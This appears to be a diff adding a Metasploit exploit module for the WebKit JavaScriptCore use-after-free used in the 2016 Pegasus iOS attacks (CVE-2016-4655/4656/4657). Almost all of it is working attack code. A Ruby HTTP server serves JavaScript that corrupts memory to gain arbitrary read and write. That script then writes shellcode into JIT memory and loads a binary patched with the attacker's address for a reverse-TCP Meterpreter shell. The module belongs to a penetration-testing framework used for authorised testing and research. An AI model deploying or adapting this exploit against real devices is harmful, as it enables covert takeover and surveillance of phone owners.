@@ -1,0 +1,302 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'WebKit not_number defineProperties UAF',
+      'Description'    => %q{
+          This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'qwertyoruiop', # jbme.qwertyoruiop.com
+        'siguza',       # PhoenixNonce
+        'tihmstar',     # PhoenixNonce
+        'timwr',        # metasploit integration
+        ],
+      'References'     => [
+          ['CVE', '2016-4655'],
+          ['CVE', '2016-4656'],
+          ['CVE', '2016-4657'],
+          ['BID', '92651'],
+          ['BID', '92652'],
+          ['BID', '92653'],
+          ['URL', 'https://blog.lookout.com/trident-pegasus'],
+          ['URL', 'https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/'],
+          ['URL', 'https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf'],
+          ['URL', 'https://github.com/Siguza/PhoenixNonce'],
+          ['URL', 'https://jndok.github.io/2016/10/04/pegasus-writeup/'],
+          ['URL', 'https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html'],
+        ],
+      'Arch'           => ARCH_AARCH64,
+      'Platform'       => 'apple_ios',
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },
+      'Targets'        => [[ 'Automatic', {} ]],
+      'DisclosureDate' => 'Aug 25 2016'))
+    register_options(
+      [
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 8080 ]),
+        OptString.new('URIPATH', [ true, "The URI to use for this exploit.", "/" ])
+      ])
+  end
+
+  def on_request_uri(cli, request)
+    print_status("Request from #{request['User-Agent']}")
+    if request.uri =~ %r{/loader$}
+      print_good("Target is vulnerable.")
+      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "loader" )
+      loader_data = File.read(local_file, {:mode => 'rb'})
+      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
+      return
+    elsif request.uri =~ %r{/exploit$}
+      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "exploit" )
+      loader_data = File.read(local_file, {:mode => 'rb'})
+      payload_url = "tcp://#{datastore["LHOST"]}:#{datastore["LPORT"]}"
+      payload_url_index = loader_data.index('PAYLOAD_URL')
+      loader_data[payload_url_index, payload_url.length] = payload_url
+      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
+      print_status("Sent exploit (#{loader_data.size} bytes)")
+      return
+    end
+    html = %Q^
+<html>
+<body>
+<script>
+ function load_binary_resource(url) {
+   var req = new XMLHttpRequest();
+   req.open('GET', url, false);
+   req.overrideMimeType('text/plain; charset=x-user-defined');
+   req.send(null);
+   return req.responseText;
+ }
+ var mem0 = 0;
+ var mem1 = 0;
+ var mem2 = 0;
+
+ function read4(addr) {
+  mem0[4] = addr;
+  var ret = mem2[0];
+  mem0[4] = mem1;
+  return ret;
+ }
+
+ function write4(addr, val) {
+  mem0[4] = addr;
+  mem2[0] = val;
+  mem0[4] = mem1;
+ }
+ filestream = load_binary_resource("exploit")
+ var shll = new Uint32Array(filestream.length / 4);
+ for (var i = 0; i < filestream.length;) {
+  var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
+  shll[i / 4] = word;
+  i += 4;
+ }
+ _dview = null;
+ function u2d(low, hi) {
+  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+  _dview.setUint32(0, hi);
+  _dview.setUint32(4, low);
+  return _dview.getFloat64(0);
+ }
+ var pressure = new Array(100);
+ var bufs = new Array(10000);
+ dgc = function() {
+  for (var i = 0; i < pressure.length; i++) {
+   pressure[i] = new Uint32Array(0x10000);
+  }
+  for (var i = 0; i < pressure.length; i++) {
+   pressure[i] = 0;
+  }
+ }
+
+ function swag() {
+  if (bufs[0]) return;
+  for (var i = 0; i < 4; i++) {
+    dgc();
+  }
+  for (i = 0; i < bufs.length; i++) {
+   bufs[i] = new Uint32Array(0x100 * 2)
+   for (k = 0; k < bufs[i].length;) {
+    bufs[i][k++] = 0x41414141;
+    bufs[i][k++] = 0xffff0000;
+   }
+  }
+ }
+ var trycatch = "";
+ for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
+ var fc = new Function(trycatch);
+ var fcp = 0;
+ var smsh = new Uint32Array(0x10)
+
+ function smashed(stl) {
+  document.body.innerHTML = "";
+  var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
+  write4(jitf, 0xd28024d0);         //movz x16, 0x126
+  write4(jitf + 4, 0x58000060);     //ldr x0, 0x100007ee4
+  write4(jitf + 8, 0xd4001001);     //svc 80
+  write4(jitf + 12, 0xd65f03c0);    //ret
+  write4(jitf + 16, jitf + 0x20);
+  write4(jitf + 20, 1);
+  fc();
+  var dyncache = read4(jitf + 0x20);
+  var dyncachev = read4(jitf + 0x20);
+  var go = 1;
+  while (go) {
+   if (read4(dyncache) == 0xfeedfacf) {
+    for (i = 0; i < 0x1000 / 4; i++) {
+     if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
+     {
+      go = 0;
+      break;
+     }
+    }
+   }
+   dyncache += 0x1000;
+  }
+  dyncache -= 0x1000;
+  var bss = [];
+  var bss_size = [];
+  for (i = 0; i < 0x1000 / 4; i++) {
+   if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
+    bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
+    bss_size.push(read4(dyncache + i * 4 + (0x28)));
+   }
+  }
+  var shc = jitf;
+  var filestream = load_binary_resource("loader")
+  for (var i = 0; i < filestream.length;) {
+   var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
+   write4(shc, word);
+   shc += 4;
+   i += 4;
+  }
+  jitf &= ~0x3FFF;
+  jitf += 0x8000;
+  write4(shc, jitf);
+  write4(shc + 4, 1);
+  // copy macho
+  for (var i = 0; i < shll.length; i++) {
+   write4(jitf + i * 4, shll[i]);
+  }
+  for (var i = 0; i < bss.length; i++) {
+   for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
+    write4(bss[i] + k * 4, 0);
+   }
+  }
+  fc();
+ }
+
+ function go_() {
+  if (smsh.length != 0x10) {
+   smashed();
+   return;
+  }
+  dgc();
+  var arr = new Array(0x100);
+  var yolo = new ArrayBuffer(0x1000);
+  arr[0] = yolo;
+  arr[1] = 0x13371337;
+  var not_number = {};
+  not_number.toString = function() {
+   arr = null;
+   props["stale"]["value"] = null;
+   swag();
+   return 10;
+  };
+  var props = {
+   p0: {
+    value: 0
+   },
+   p1: {
+    value: 1
+   },
+   p2: {
+    value: 2
+   },
+   p3: {
+    value: 3
+   },
+   p4: {
+    value: 4
+   },
+   p5: {
+    value: 5
+   },
+   p6: {
+    value: 6
+   },
+   p7: {
+    value: 7
+   },
+   p8: {
+    value: 8
+   },
+   length: {
+    value: not_number
+   },
+   stale: {
+    value: arr
+   },
+   after: {
+    value: 666
+   }
+  };
+  var target = [];
+  var stale = 0;
+  Object.defineProperties(target, props);
+  stale = target.stale;
+  stale[0] += 0x101;
+  stale[1] = {}
+  for (var z = 0; z < 0x1000; z++) fc();
+  for (i = 0; i < bufs.length; i++) {
+   for (k = 0; k < bufs[0].length; k++) {
+    if (bufs[i][k] == 0x41414242) {
+     stale[0] = fc;
+     fcp = bufs[i][k];
+     stale[0] = {
+      'a': u2d(105, 0),
+      'b': u2d(0, 0),
+      'c': smsh,
+      'd': u2d(0x100, 0)
+     }
+     stale[1] = stale[0]
+     bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+     bck = stale[0][4];
+     stale[0][4] = 0; // address, low 32 bits
+     // stale[0][5] = 1; // address, high 32 bits == 0x100000000
+     stale[0][6] = 0xffffffff;
+     mem0 = stale[0];
+     mem1 = bck;
+     mem2 = smsh;
+     bufs.push(stale)
+     if (smsh.length != 0x10) {
+      smashed(stale[0]);
+     }
+     return;
+    }
+   }
+  }
+  setTimeout(function() {
+    document.location.reload();
+  }, 2000);
+ }
+
+dgc();
+setTimeout(go_, 200);
+</script>
+</body>
+</html>
+    ^
+    send_response(cli, html, {'Content-Type'=>'text/html'})
+  end
+
+end
